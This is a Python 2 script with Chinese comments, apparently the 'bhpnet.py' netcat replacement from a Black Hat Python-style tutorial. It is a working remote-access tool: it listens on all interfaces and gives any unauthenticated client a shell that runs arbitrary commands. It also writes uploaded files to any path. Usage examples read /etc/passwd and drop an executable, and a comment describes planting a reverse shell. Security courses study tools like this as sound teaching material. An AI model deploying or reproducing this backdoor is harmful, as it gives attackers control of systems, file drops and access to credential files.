#!/opt/local/bin/python2.7
# encoding:UTF-8

"""
用作远程执行Shell命令和上传文件
"""

import getopt
import socket
import subprocess
import sys
import threading

# 全局变量
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def run_command(command):
    """
    执行命令并返回输出值
    :param command:
    :return:
    """
    # 换行
    command = command.rstrip()

    # 执行命令并且将输出返回
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    # 将输出发送
    return output


def client_handler(client_socket):
    """
    处理客户端请求连接
    :param client_socket:
    :return:
    """
    global upload
    global execute
    global command

    # 检测上传文件
    if len(upload_destination):

        # 读取所有的字符并且写下目标
        file_buffer = ""

        # 持续读取数据直到没有符合标准的数据EOF
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # 现在我们接受这些数据并将他们写出来
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # 确认文件已经写出来
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # 检查命令执行
    if len(execute):
        # 运行命令
        output = run_command(execute)

        client_socket.send(output)

    # 如果需要一个命令行shell,那么我们进入另一个循环
    if command:

        while True:
            # 弹出一个窗口
            client_socket.send("<BHP:#> ")

            # 接受文件与数据直到遇到换行符
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # 返还命令输出
            response = run_command(cmd_buffer)

            # 返回响应数据
            client_socket.send(response)


def server_loop():
    """
    监听连接请求
    :return:
    """
    global target
    global port

    # 监听所有接口
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # 分拆一个线程用于处理新的客户端
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def client_sender(buffer):
    """
    客户端线程
    :param buffer:
    :return:
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 连接到目标主机
        client.connect((target, port))

        # 如果命令是从标准输入里来的,那么就直接发送过去
        # 否则我们就进行阻塞,直到本地数据发送完成

        if len(buffer):
            client.send(buffer)

        while True:

            # 等待数据回传
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print response,

            # 等待更多的输入
            buffer = raw_input("")
            buffer += "\n"

            # 发送
            client.send(buffer)


    except:
        # 异常捕获
        print "[*] Exception! Exiting."

        # 关闭连接
        client.close()


def usage():
    print "Netcat Replacement"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen                - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run   - execute the given file upon receiving a connection"
    print "-c --command               - initialize a command shell"
    print "-u --upload=destination    - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "创建服务端: python bhnet.py -l -p 9999 -c"
    print "创建客户端: python bhnet.py -t localhost -p 9999"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # 读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # 进行监听?或者是通过标准输入发送数据?
    if not listen and len(target) and port > 0:
        # 从命令行读取内存数据
        buffer = sys.stdin.read()

        # 发送数据
        client_sender(buffer)

        # 开始监听并准备上传文件,执行命令并放置一个反弹Shell
    if listen:
        server_loop()


main()
